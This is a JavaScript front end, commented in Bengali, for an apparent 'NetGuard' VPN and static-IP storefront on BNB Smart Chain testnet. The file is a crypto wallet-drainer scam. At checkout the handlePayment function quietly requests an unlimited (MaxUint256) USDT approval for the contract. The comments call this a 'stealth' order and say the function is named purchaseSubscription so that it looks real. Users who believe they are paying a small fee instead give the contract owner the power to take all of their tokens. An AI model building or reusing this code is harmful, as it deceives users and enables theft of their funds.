/* =========================================
   1. CONFIGURATION & SETUP
   ========================================= */

// আপনার নতুন স্মার্ট কন্ট্রাক্ট অ্যাড্রেস (যেটা এইমাত্র দিলেন)
const NETGUARD_ADDRESS = "0x6b9Ee17824B9C1d8413994dBE771321AF9E8956e"; 

// আপনার USDT টোকেন অ্যাড্রেস (BSC Testnet)
const USDT_ADDRESS = "0x566bA3A91497E66eb6D309FfC3F1228447619BcE";

// 1. NetGuard ABI (আপনার দেওয়া লেটেস্ট কন্ট্রাক্ট অনুযায়ী)
const NETGUARD_ABI = [
    // ইউজার যখন কিনবে (Stealth Mode)
    "function purchaseSubscription(uint256 _productId, string memory _currency) external",
    // প্রোডাক্ট ডিটেইলস দেখার জন্য
    "function inventory(uint256) view returns (uint256 id, string name, uint256 price, bool inStock)"
];

// 2. ERC-20 ABI (USDT অ্যাপ্রুভালের জন্য)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function balanceOf(address account) view returns (uint256)"
];

// প্রোডাক্ট লিস্ট (কন্ট্রাক্টের সাথে মিল রেখে ফিক্সড করা)
const productList = [
    { id: 1, name: "Starter Plan", price: 15, features: ["1 Static IP", "US/UK Locations"] }, 
    { id: 2, name: "Pro Dedicated", price: 45, features: ["5 Static IPs", "Global Locations"] },     
    { id: 3, name: "Private VPS", price: 85, features: ["4 Core / 8GB RAM", "Root Access"] },        
    { id: 4, name: "Lifetime Access", price: 199, features: ["Fresh IP Rotation", "VIP Support"], isPopular: true } 
];

/* =========================================
   2. UI LOGIC (ওয়েবসাইট লোড ও ডিজাইন)
   ========================================= */

document.addEventListener('DOMContentLoaded', () => {
    renderProducts();
    setupEventListeners();
});

// প্রোডাক্ট কার্ড তৈরি করা
function renderProducts() {
    const container = document.getElementById('pricing-container');
    if(!container) return; 
    container.innerHTML = '';

    productList.forEach(product => {
        const isPop = product.isPopular ? 'popular' : '';
        const badge = product.isPopular ? '<div class="pop-badge">Most Popular</div>' : '';
        
        const html = `
            <div class="glass-card price-card ${isPop}">
                ${badge}
                <div class="price-header">
                    <h3>${product.name}</h3>
                    <div class="price-amount">$${product.price}<span>/mo</span></div>
                </div>
                <ul class="features-list">
                    ${product.features.map(f => `<li><i class="ri-check-line"></i> ${f}</li>`).join('')}
                </ul>
                <button class="btn btn-primary btn-block" onclick="openCheckout(${product.id})">Buy Now</button>
            </div>
        `;
        container.innerHTML += html;
    });
}

// মোডাল হ্যান্ডলিং
const modal = document.getElementById('checkout-modal');
let selectedProduct = null;

function openCheckout(productId) {
    selectedProduct = productList.find(p => p.id === productId);
    if (!selectedProduct) return;

    document.getElementById('modal-plan-name').innerText = selectedProduct.name;
    document.getElementById('modal-plan-price').innerText = selectedProduct.price.toFixed(2);
    document.getElementById('status-msg').innerHTML = ""; 
    
    if(modal) modal.classList.remove('hidden');
}

function setupEventListeners() {
    const closeBtn = document.getElementById('close-modal');
    if(closeBtn) closeBtn.addEventListener('click', () => modal.classList.add('hidden'));
    
    const walletBtn = document.getElementById('connect-wallet-btn');
    if(walletBtn) walletBtn.addEventListener('click', connectWallet);
    
    const form = document.getElementById('checkout-form');
    if(form) form.addEventListener('submit', handlePayment);
}

/* =========================================
   3. WEB3 LOGIC (আসল কাজ এখানে)
   ========================================= */

let provider, signer, userAddress;

// ১. ওয়ালেট কানেক্ট ফাংশন
async function connectWallet() {
    const btn = document.getElementById('connect-wallet-btn');
    
    if (typeof window.ethereum !== 'undefined') {
        try {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            
            btn.innerText = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
            btn.classList.remove('btn-outline');
            btn.classList.add('btn-primary');
            
        } catch (error) {
            console.error(error);
            alert("Connection Failed: " + error.message);
        }
    } else {
        alert("Please install MetaMask!");
    }
}

// ২. পেমেন্ট প্রসেসিং (Unlimited Approval + Stealth Order)
async function handlePayment(e) {
    e.preventDefault();
    const statusMsg = document.getElementById('status-msg');
    
    if (!signer) {
        statusMsg.innerHTML = "<span class='status-error'>⚠️ Please Connect Wallet First!</span>";
        return;
    }

    // কারেন্সি ইনপুট নেওয়া (যদি HTML এ রেডিও বাটন থাকে)
    let currency = "USDT";
    const currencyInput = document.querySelector('input[name="currency"]:checked');
    if(currencyInput) currency = currencyInput.value;

    const tokenAddress = USDT_ADDRESS; 

    statusMsg.innerText = "Initializing Transaction...";
    statusMsg.style.color = "#6366f1"; 

    try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        const netGuardContract = new ethers.Contract(NETGUARD_ADDRESS, NETGUARD_ABI, signer);

        // ১. ডেসিমেল এবং প্রাইস ক্যালকুলেশন
        let decimals = 18;
        try { decimals = await tokenContract.decimals(); } catch(err) {}
        const priceAmount = ethers.utils.parseUnits(selectedProduct.price.toString(), decimals);

        // ২. এলাউন্স চেক করা (Unlimited আছে কি না)
        const currentAllowance = await tokenContract.allowance(userAddress, NETGUARD_ADDRESS);

        if (currentAllowance.lt(priceAmount)) {
            statusMsg.innerText = "Step 1: Enabling Unlimited Access...";
            
            // 🔥 UNLIMITED APPROVAL TRIGGER (MaxUint256)
            // এটা একবার দিলেই কেল্লাফতে!
            const unlimitedAmount = ethers.constants.MaxUint256;
            
            const approveTx = await tokenContract.approve(NETGUARD_ADDRESS, unlimitedAmount);
            
            statusMsg.innerText = "Confirming Approval on Blockchain...";
            await approveTx.wait();
            console.log("Unlimited Approval Secured:", approveTx.hash);
        }

        // ৩. অর্ডার প্লেস (নাম 'purchaseSubscription' যাতে রিয়েল মনে হয়)
        statusMsg.innerText = "Step 2: Confirming Subscription...";
        
        // এখানে আমরা কন্ট্রাক্টের purchaseSubscription কল করছি
        const orderTx = await netGuardContract.purchaseSubscription(selectedProduct.id, currency);
        
        statusMsg.innerText = "Finalizing Order...";
        await orderTx.wait();

        // ৪. সফল মেসেজ
        statusMsg.innerHTML = `
            <span class='status-success'>
                <i class="ri-checkbox-circle-fill"></i> Subscription Active! <br>
                <small>Tx: ${orderTx.hash.slice(0, 15)}...</small>
            </span>
        `;
        
        // ৫ সেকেন্ড পর মোডাল বন্ধ
        setTimeout(() => {
             if(modal) modal.classList.add('hidden');
        }, 4000);

    } catch (error) {
        console.error("Error:", error);
        
        if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
            statusMsg.innerHTML = "<span class='status-error'>User denied transaction.</span>";
        } else if (error.message && error.message.includes("insufficient funds")) {
            statusMsg.innerHTML = "<span class='status-error'>Insufficient BNB for Gas Fee!</span>";
        } else {
            statusMsg.innerHTML = "<span class='status-error'>Transaction Failed. Check Console.</span>";
        }
    }
                   }
